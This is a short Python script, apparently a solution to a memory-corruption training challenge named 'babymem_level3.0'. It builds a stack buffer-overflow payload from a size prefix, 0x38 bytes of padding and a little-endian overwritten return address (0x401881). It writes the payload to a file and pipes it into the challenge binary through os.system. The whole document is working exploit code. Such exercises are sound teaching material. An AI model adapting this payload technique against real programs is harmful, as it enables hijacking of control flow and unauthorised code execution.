import os
s=b"100\x10"+b"A"*0x38+0x401881.to_bytes(8,"little")
print(s)
fd = open("ttt-raw","wb+")
fd.write(s)
fd.close()
os.system("cat ttt-raw | /challenge/babymem_level3.0")